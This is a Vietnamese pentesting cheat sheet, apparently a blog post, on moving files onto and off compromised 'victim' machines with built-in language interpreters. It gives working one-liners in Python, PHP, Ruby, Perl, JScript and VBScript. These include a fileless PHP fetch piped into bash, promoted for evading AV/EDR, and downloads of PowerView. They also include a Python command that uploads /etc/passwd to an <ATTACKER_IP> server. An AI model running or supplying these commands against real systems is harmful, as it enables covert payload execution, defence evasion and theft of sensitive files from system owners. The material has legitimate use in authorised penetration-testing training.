---
title: "File Transfer bằng Ngôn ngữ Lập trình"
date: 2026-04-16 00:04:00 +0700
categories: [Pentest, File Transfer]
tags: [file-transfer, python, php, ruby, perl, javascript, vbscript, living-off-the-land]
---

> **Tại sao cần?** Khi `curl` và `wget` bị block bởi firewall/AV, ta có thể tận dụng các ngôn ngữ lập trình **đã có sẵn trên máy nạn nhân** để download/upload file — không cần đưa thêm công cụ lạ vào hệ thống. Kỹ thuật này gọi là **Living off the Land (LotL)**.
{: .prompt-info}

---

## 🐍 Python

> Flag `-c` cho phép chạy code trực tiếp trên command line, không cần tạo file `.py`.
{: .prompt-info}

```bash
# Python 2
python2.7 -c 'import urllib;urllib.urlretrieve("https://<URL>/file.sh", "file.sh")'

# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://<URL>/file.sh", "file.sh")'
```

---

## 🐘 PHP

> PHP chiếm ~77% web server — gần như luôn có mặt trên các máy chủ web.
{: .prompt-info}

```bash
# Cách 1 — file_get_contents() (đơn giản nhất)
php -r '$file = file_get_contents("https://<URL>/file.sh"); file_put_contents("file.sh",$file);'

# Cách 2 — fopen() (phù hợp file lớn, đọc theo buffer)
php -r 'const BUFFER = 1024; $fremote = fopen("https://<URL>/file.sh", "rb"); $flocal = fopen("file.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Cách 3 — Pipe vào Bash (Fileless Execution)
php -r '$lines = @file("https://<URL>/file.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

> **Fileless Execution:** Cách 3 **không tạo file trên disk** → khó bị phát hiện hơn bởi AV/EDR. Dùng khi cần stealth cao.
{: .prompt-warning}

---

## 💎 Ruby

```bash
ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI.parse("https://<URL>/file.sh")))'
```

---

## 🐪 Perl

```bash
perl -e 'use LWP::Simple; getstore("https://<URL>/file.sh", "file.sh");'
```

---

## 🪟 JavaScript & VBScript (Windows only)

> Chỉ dùng trên **Windows**, chạy qua `cscript.exe`. Hữu ích khi PowerShell bị restrict.
{: .prompt-info}

**Bước 1 — Tạo file `wget.js`:**

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

**Hoặc tạo file `wget.vbs`:**

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

**Bước 2 — Chạy script:**

```cmd
cscript.exe /nologo wget.js https://<URL>/PowerView.ps1 PowerView.ps1
cscript.exe /nologo wget.vbs https://<URL>/PowerView.ps1 PowerView.ps1
```

---

## ⬆️ Upload File — Python3 uploadserver

**Bước 1 — Trên máy attacker:**

```bash
python3 -m uploadserver
```

**Bước 2 — Trên máy victim:**

```bash
python3 -c 'import requests;requests.post("http://<ATTACKER_IP>:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---

## Bảng Tham Khảo Nhanh

| Ngôn ngữ | OS | Dùng khi nào |
|---|---|---|
| Python 2/3 | Linux / Windows | Phổ biến nhất, ưu tiên dùng trước |
| PHP | Linux / Windows | Máy chủ web |
| Ruby | Linux | Dev/scripting server |
| Perl | Linux | Dev/scripting server |
| JavaScript (cscript) | Windows | PowerShell bị block |
| VBScript (cscript) | Windows | PowerShell bị block |

> **Thứ tự ưu tiên thực chiến:** `Python3` → `PHP` → `Ruby/Perl` → `JS/VBS (Windows)`.
> Luôn kiểm tra ngôn ngữ nào có sẵn trước: `which python3`, `which php`, `which ruby`, `which perl`
{: .prompt-tip}
